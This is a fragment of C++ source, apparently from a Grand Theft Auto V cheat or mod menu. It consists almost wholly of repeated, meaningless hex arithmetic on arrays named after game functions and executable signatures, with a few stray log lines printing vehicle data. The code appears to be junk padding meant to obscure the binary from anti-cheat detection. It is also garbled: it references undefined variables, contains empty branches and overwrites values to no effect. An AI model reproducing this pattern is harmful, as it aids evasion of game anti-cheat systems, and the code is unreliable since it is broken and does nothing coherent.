			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<Livery>-1</Livery>");
			Extern_Reader::LOG::LogSemHora("<NumberPlateText>80HSK762</NumberPlateText>");
			Extern_Reader::LOG::LogSemHora("<NumberPlateIndex>0</NumberPlateIndex>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
